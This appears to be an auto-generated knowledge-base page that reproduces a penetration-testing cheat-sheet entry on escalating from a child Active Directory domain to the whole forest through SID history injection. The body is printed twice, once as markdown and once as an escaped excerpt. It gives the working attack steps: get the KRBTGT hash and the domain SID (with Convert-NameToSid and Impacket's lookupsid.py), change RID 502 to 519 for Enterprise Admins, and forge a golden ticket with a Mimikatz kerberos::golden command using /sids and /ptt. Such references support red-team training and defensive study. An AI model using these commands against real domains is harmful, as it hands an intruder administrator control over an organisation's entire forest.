---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Child Domain to Forest Compromise - SID Hijacking

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-trust-sid-hijacking` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/trust-sid-hijacking.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Most trees are linked with dual sided trust relationships to allow for sharing of resources.

## Preserved Body

````markdown
Most trees are linked with dual sided trust relationships to allow for sharing of resources.
By default the first domain created if the Forest Root.

**Requirements**:

- KRBTGT Hash
- Find the SID of the domain

    ```powershell
    $ Convert-NameToSid target.domain.com\krbtgt
    S-1-5-21-2941561648-383941485-1389968811-502

    # with Impacket
    lookupsid.py domain/user:password@10.10.10.10
    ```

- Replace 502 with 519 to represent Enterprise Admins

**Exploitation**:

- Create golden ticket and attack parent domain.

    ```powershell
    kerberos::golden /user:Administrator /krbtgt:HASH_KRBTGT /domain:domain.local /sid:S-1-5-21-2941561648-383941485-1389968811 /sids:S-1-5-SID-SECOND-DOMAIN-519 /ptt
    ```

## References

- [Training - Attacking and Defending Active Directory Lab - Altered Security](https://www.alteredsecurity.com/adlab)
````

## Source Verification

[source record](../../sources/internalallthethings/child-domain-to-forest-compromise-sid-hijacking.md)

## Evidence Excerpt

````text
_body: "# Child Domain to Forest Compromise - SID Hijacking\n\nMost trees are linked with dual sided trust relationships to\
\ allow for sharing of resources.\nBy default the first domain created if the Forest Root.\n\n**Requirements**:\n\n- KRBTGT\
\ Hash\n- Find the SID of the domain\n\n    ```powershell\n    $ Convert-NameToSid target.domain.com\\krbtgt\n    S-1-5-21-2941561648-383941485-1389968811-502\n\
\n    # with Impacket\n    lookupsid.py domain/user:password@10.10.10.10\n    ```\n\n- Replace 502 with 519 to represent\
\ Enterprise Admins\n\n**Exploitation**:\n\n- Create golden ticket and attack parent domain.\n\n    ```powershell\n    kerberos::golden\
\ /user:Administrator /krbtgt:HASH_KRBTGT /domain:domain.local /sid:S-1-5-21-2941561648-383941485-1389968811 /sids:S-1-5-SID-SECOND-DOMAIN-519\
\ /ptt\n    ```\n\n## References\n\n- [Training - Attacking and Defending Active Directory Lab - Altered Security](https://www.alteredsecurity.com/adlab)"
_relative_path: active-directory/trust-sid-hijacking.md
````
